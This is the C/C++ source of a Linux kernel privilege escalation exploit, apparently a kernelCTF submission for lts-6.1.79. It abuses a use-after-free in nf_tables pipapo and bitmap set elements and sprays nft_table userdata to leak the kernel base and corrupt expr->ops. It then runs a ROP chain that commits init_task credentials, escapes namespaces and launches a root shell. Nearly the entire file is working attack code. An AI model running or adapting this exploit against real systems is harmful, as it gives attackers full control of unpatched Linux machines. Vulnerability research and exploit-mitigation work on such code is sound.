#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/sysinfo.h>
#include <linux/netlink.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nf_tables_compat.h>
#include <netlink/msg.h>
#include <netlink/attr.h>
#include <netlink/netlink.h>
#include <netlink/netfilter/nfnl.h>

#include "obj.h"
#include "setelem.h"
#include "table.h"
#include "set.h"

#include <cassert>

#include <xdk/core.h>
#include <xdk/postrip.h>

INCBIN(target_db, "target_db.kxdb");

char *leak_data = NULL;
char *table_udata = NULL;
int table_num = 0;
uint64_t kernel_base = 0;
unsigned long user_cs,user_ss,user_rsp,user_rflags;

void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
}

int setup_sandbox(void) {
  if (unshare(CLONE_NEWUSER) < 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    return -1;
  }
  if (unshare(CLONE_NEWNET) < 0) {
    perror("[-] unshare(CLONE_NEWNET)");
    return -1;
  }
  return 0;
}

void send_msg_list(struct nl_sock * socket, struct nlmsghdr **msg_list, int num){
    struct nl_msg * msg = nlmsg_alloc();
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            NFNL_MSG_BATCH_BEGIN,   // TYPE
            sizeof(struct nfgenmsg),
            NLM_F_REQUEST 
    );
    struct nfgenmsg * h = (struct nfgenmsg *)malloc(sizeof(struct nfgenmsg));
    h->nfgen_family = 2;
    h->version = 0;
    h->res_id = NFNL_SUBSYS_NFTABLES;
    memcpy(nlmsg_data(hdr1), h, sizeof(struct nfgenmsg));
    struct nl_msg * msg3 = nlmsg_alloc();
    struct nlmsghdr *hdr3 = nlmsg_put(
            msg3,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            NFNL_MSG_BATCH_END,// TYPE
            sizeof(struct nfgenmsg),
            NLM_F_REQUEST 
    );
    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len) + NLMSG_ALIGN(hdr3->nlmsg_len);
    int i;
    for(i=0;i<num;i++){
    	total_size = total_size + NLMSG_ALIGN(msg_list[i]->nlmsg_len);
    }
    char *buf = (char *)malloc(total_size);
    memset(buf, 0, total_size);
    memcpy(buf, hdr1, NLMSG_ALIGN(hdr1->nlmsg_len));
    char *off = buf + NLMSG_ALIGN(hdr1->nlmsg_len);
    for(i=0;i<num;i++){
    	memcpy(off, msg_list[i], NLMSG_ALIGN(msg_list[i]->nlmsg_len));
	off = off + NLMSG_ALIGN(msg_list[i]->nlmsg_len);
    }
    memcpy(off, hdr3, NLMSG_ALIGN(hdr3->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    if (res < 0) {
        printf("sending message failed\n");
    }
}

int nl_callback_get_table(struct nl_msg* recv_msg, void* arg)
{
    struct nlmsghdr * ret_hdr = nlmsg_hdr(recv_msg);
    struct nlattr * tb_msg[NFTA_TABLE_MAX+1];
    memset(tb_msg, 0, NFTA_TABLE_MAX * 8);

    if (ret_hdr->nlmsg_type == NLMSG_ERROR) {
        return NL_STOP;
    }

    struct nlattr *attr = (struct nlattr *)((void *)ret_hdr + nlmsg_total_size(sizeof(struct nfgenmsg)));
    int attrlen = ret_hdr->nlmsg_len - nlmsg_total_size(sizeof(struct nfgenmsg));
    nla_parse(tb_msg, NFTA_TABLE_MAX, attr, attrlen, NULL);
    char * table_name = NULL;
    char * set_name = NULL;
    if (tb_msg[NFTA_TABLE_NAME])
        printf("Getting %s\n", nla_get_string(tb_msg[NFTA_TABLE_NAME]));

    if (tb_msg[NFTA_TABLE_USERDATA]) {
	    free(table_udata);
	    table_udata = (char *)malloc(nla_len(tb_msg[NFTA_TABLE_USERDATA]));
	    nla_memcpy(table_udata, tb_msg[NFTA_TABLE_USERDATA], nla_len(tb_msg[NFTA_TABLE_USERDATA]));
    }

    return NL_OK;
}

void spray_tables(struct nl_sock * socket, int len, char *udata, int size){
   char *tmp = (char *)malloc(0x100);
   memset(tmp,0,0x100);
   int i;
   for(i = 0; i < len; i++) {
        snprintf(tmp, 0x100, "table_for_leak_%ld", table_num);
        new_table_with_udata(socket, tmp, udata, size);
        ++table_num;
   }
   free(tmp);
}

int exploit(struct nl_sock *socket){
    TargetDb kxdb("target_db.kxdb", target_db);

    Target st("kernelctf", "lts-6.1.79");

    st.AddStruct("nft_expr_ops", 136,
        {{"dump", 64, 8},
            {"type", 120, 8}});
    st.AddStruct("nft_bitmap_elem", 32, {});
    st.AddStruct("nft_set_elem_expr", 8, {});
    st.AddStruct("nft_expr", 8, {{"ops", 0, 8}});

    st.AddSymbol("nft_last_ops", 0x1b2a2e0);
    st.AddSymbol("nft_last_type", 0x2b69a00);

    kxdb.AddTarget(st);

    auto target = kxdb.AutoDetectTarget();
    printf("[+] Running on target: %s %s\n", target.GetDistro().c_str(), target.GetReleaseName().c_str());

    auto nft_expr_offset = target.GetStruct("nft_bitmap_elem").size +
      target.GetStruct("nft_set_elem_expr").size +
      target.GetStruct("nft_expr").fields.at("ops").offset;

    int i;
    char *table = "table for exp";
    char *pipapo_set = "set pipapo for exp";
    char *bitmap_set = "set bitmap for exp";
    char *target_obj = "obj for exp";

    new_table(socket, table);
    //Step 1 Create a pipapo set `A`
    new_set_pipapo(socket,table, pipapo_set, 0x40, NFT_OBJECT_CT_EXPECT);//Set A
    new_set_bitmap(socket, table, bitmap_set);

    char *key = (char *)malloc(0x40);
    char *key_end = (char *)malloc(0x40);
    char *pad = (char *)malloc(0x100);
    memset(pad,0x41,0x100);
    uint64_t hash_key;

    //Step 2 Create element `B` and element `C` in set `A`.
    new_obj_ct_expect(socket, table, target_obj, NULL, 0);
    memset(key,0x41,0x40);
    spray_tables(socket,0x200, pad, 0xd0);
    new_setelem(socket, table, pipapo_set, pad, 0x80, target_obj, key, 0x40, NULL, 0, 0);//Set element B
    memset(key,0x42,0x40);
    new_setelem(socket, table, pipapo_set, pad, 0x80, target_obj, key, 0x40, NULL, 0, 0);//Set element C
    spray_tables(socket,0x200, pad, 0xd0);
    //Step 3
    struct nlmsghdr **msg_list = (struct nlmsghdr **)malloc(sizeof(struct nlmsghdr *)*5);
    memset(msg_list, 0, sizeof(struct nlmsghdr *)*5);
    memset(key,0x43,0x40);
    msg_list[0] = new_setelem_msg(table, pipapo_set, pad, 0x80, target_obj, key, 0x40, NULL, 0);//Set element D
    msg_list[1] = del_set_msg(table, pipapo_set);
    send_msg_list(socket, msg_list, 2);
    sleep(1);//Waiting the function nf_tables_commit
    //Now we try to get the heap back and check if we success
    //Step 4 Try to alloc the heap of the set element `C` back by creating `nft_table` with `NFTA_TABLE_USERDATA`.
    struct nl_sock * socket2 = nl_socket_alloc();
    if (nfnl_connect(socket2) < 0) {
        printf("nfnl_connect fail!\n");
        return 0;
    }

    nl_socket_modify_cb(socket2,NL_CB_MSG_IN, NL_CB_CUSTOM, nl_callback_get_table, NULL);
    int try_num = 0;
    char *table_name = (char *)malloc(0x100);
    int e = 0,f = -1;
    while(1) {
	    printf("trying %d\n",try_num);
	    snprintf(table_name, 0x100, "table for test %d", try_num);
	    *(int *)pad = try_num;
	    new_table_with_udata(socket, table_name, pad, 0xd0);
	    int i;
	    for (i=0;i<try_num;i++) {
		    snprintf(table_name, 0x100, "table for test %d", i);
		    get_table(socket2, table_name);
		    nl_recvmsgs_default(socket2);
            nl_recvmsgs_default(socket2);
		    printf("Get udata : %d\n", *(int *)table_udata);

            if (*(int *)table_udata != i) {
		    //It means we get two same object from the free list of kernel heap.
			    e = *(int *)table_udata;
			    f = i;
			    break;
		    }
	    }

	    if (f != -1)
		    break;
	    try_num++;
	    sleep(0.1);//Waiting the function nf_tables_commit
    }

    //Now, we free many object to avoid crash
    char *tmp = (char *)malloc(0x100);
    memset(tmp,0,0x100);

    for (i = 0x180; i < 0x280; i++) {
	    snprintf(tmp, 0x100, "table_for_leak_%ld", i);
        del_table(socket, tmp);
    }
    sleep(0.5);//Waiting the function nft_commit_release which finally call nf_tables_table_destroy

    printf("We get it! E: %d F: %d \n", e, f);

    snprintf(tmp, 0x100, "table for test %d", e);
    //Step 5 Delete `nft_table E`.
    del_table(socket, tmp);
    sleep(5);//Waiting the function nft_commit_release which finally call nf_tables_table_destroy

    //Step 6 Spray heap to get the heap of `nft_table E->udata` back.
    uint16_t bitmap_key = 0;
    i = 0;
    while(i < 10){
        bitmap_key = i;
	    new_setelem_with_expr(socket, table, bitmap_set, pad, 0xb0, NULL, (char *)(&bitmap_key), 2, NULL, 0);
	    snprintf(tmp, 0x100, "table for test %d", f);
    	get_table(socket2, tmp);//[1]
    	nl_recvmsgs_default(socket2);
    	nl_recvmsgs_default(socket2);

        printf("Heap spary attempt: %d\n", i);
        printf("Get ops: 0x%llx\n",*(uint64_t *)(table_udata + nft_expr_offset)); // nft_expr_offset = 0x28 = offset(elem, expr[0]->ops), the elem is created by function nft_set_elem_init

        kernel_base = *(uint64_t *)(table_udata + nft_expr_offset) - target.GetSymbolOffset("nft_last_ops"); //nft_last_ops, 0x28 = offset(elem, expr[0]->ops), the elem is created by function nft_set_elem_init
        if (is_kaslr_base(kernel_base)) {
            printf("kernel_base: 0x%llx\n", kernel_base);
            break;
	    }

	    sleep(0.1); // Waiting the function nf_tables_commit.
	    i++;
    }

    if (i == 10) {
        printf("Heap spray to get the heap of `nft_table E->udata` back failed after 10 attempts.\n");
        return 0;
    }

    //Save it. We will use it later.
    //Step 7: Dump `nft_table F`. We have dump it in [1]
    printf("[+] ROP chain:\n");
    RopChain rop(target, kernel_base);
    rop.AddRopAction(RopActionId::COMMIT_INIT_TASK_CREDS);
    rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, {1});
    rop.AddRopAction(RopActionId::TELEFORK, {1000000});
    HexDump::Print(rop.GetData());
    printf("[+] ROP chain size: %d\n", rop.GetData().size());

    Payload payload1(nft_expr_offset);
    Payload payload2(0xd0 - nft_expr_offset);

    PayloadBuilder builder(target.GetPivots(), kernel_base); // create builder

    builder.AddPayload(payload1, std::nullopt, std::nullopt);
    builder.AddPayload(payload2, Register::RBP, 0); // add payload, with register, and rip_offset
    builder.AddRopChain(rop); // add a rop chain
    if(!builder.Build()) exit(-1); // build it

    builder.PrintDebugInfo();

    printf("[+] Stack pivot and ROP part of payload:\n");
    HexDump::Print(payload2.GetData());
    printf("Stack pivot and ROP part of payload: %d\n", payload2.GetData().size());

    std::vector<uint8_t> full_payload;
    full_payload.insert(full_payload.end(), payload1.GetData().begin(), payload1.GetData().end());
    full_payload.insert(full_payload.end(), payload2.GetData().begin(), payload2.GetData().end());

    //now we get ops, we try to add a small setelem and leak it. We will use this setelem as expr->ops target.
    //Step 8: Create another set element `G`.
    bitmap_key++;
    new_setelem(socket, table, bitmap_set, pad, 0x60, NULL, (char *)(&bitmap_key), 2, NULL, 0, 0);//set element G
    snprintf(tmp, 0x100, "table for test %d", f);

    get_table(socket2, tmp);
    nl_recvmsgs_default(socket2);
    nl_recvmsgs_default(socket2);
    printf("Get next setelem : %llx\n",*(uint64_t *)table_udata);// 0 = offset(head.next,struct nft_bitmap_elem)

    uint64_t ops_addr = *(uint64_t *)table_udata;//We use the heap of the next set element as the expr[0]->ops
    //Free the small setelem, and fill it with our target expr->ops->dump and expr->ops->type
    //Step 9 : Delete set element `G`.Fill the heap memory of set element `G` through heap spraying.
    del_setelem(socket, table, bitmap_set, (char *)(&bitmap_key), 2, NULL, 0);
    sleep(1); //Waiting the function nft_commit_release which finally call nf_tables_set_elem_destroy

    memcpy(&full_payload[0], table_udata, nft_expr_offset);
    memcpy(&full_payload[nft_expr_offset], (char *)(&ops_addr), 8);

    printf("[+] Full payload:\n");
    HexDump::Print(full_payload);
    printf("Full payload size: %d\n", full_payload.size());

    auto nft_expr_ops = target.GetStruct("nft_expr_ops");
    //fake ops->dump
    *(uint64_t *)&pad[nft_expr_ops.fields.at("dump").offset] = kernel_base + builder.GetStackPivot().GetGadgetOffset();

    //fake ops->type
    *(uint64_t *)&pad[nft_expr_ops.fields.at("type").offset] = kernel_base + target.GetSymbolOffset("nft_last_type"); /*the address of nft_last_type

                                  In function nf_tables_fill_expr_info:
                                    if (nla_put_string(skb, NFTA_EXPR_NAME, expr->ops->type->name))
                                  so we need to fake ops->type to avoid kernel crash
                                  */

    spray_tables(socket,0x200, pad, 0x80);

    //Step 10: Delete `nft_table F`.
    del_table(socket, tmp);
    //Step 11 and 12
    //Try to get it back and control RIP
    sleep(5);//Waiting the function nft_commit_release which finally call nf_tables_table_destroy
    bitmap_key = i;
    int t = 0;
    while(1){
	    sleep(0.1);//Avoid heap crashes caused by excessive kmalloc.
    	spray_tables(socket, 1, (char *)(full_payload.data()), 0xd0);
        get_setelem(socket, table, bitmap_set, (char *)(&bitmap_key), 2);
    	printf("%d\n",t);

        printf("[*] Launching shell\n");
        system("/bin/sh");
	    t++;
    }

    printf("End\n");
    while(1);
}

struct nl_sock * setup_nl_socket(){
    struct nl_sock * socket = nl_socket_alloc();

    if(nfnl_connect(socket) < 0) {
        printf("nfnl_connect fail!\n");
        return NULL;
    }
    return socket;
}

int main(void) {
    if (setup_sandbox() < 0) {
        printf("Create sandbox fail!\n");
        return 0;
    }
    pin_on_cpu(0);
    struct nl_sock * socket = setup_nl_socket();
    if (socket == NULL)
	    return 0;
    exploit(socket);
    return 0;
}
